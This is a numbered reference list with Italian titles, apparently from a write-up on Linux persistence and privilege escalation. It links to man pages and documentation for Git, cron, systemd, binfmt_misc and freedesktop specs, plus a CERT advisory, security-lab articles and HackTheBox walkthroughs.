- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — pagina del manuale Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — pagina del manuale Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentazione del kernel Linux](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associazioni delle applicazioni MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specifica Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specifica Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguaggio Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile crypto di Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilità della page cache di AF_ALG nel kernel Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentazione di Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentazione di Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentazione della configurazione di Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — pagina del manuale Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentazione dei generatori di systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — ingegneria del rilevamento Linux: meccanismi di persistenza](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
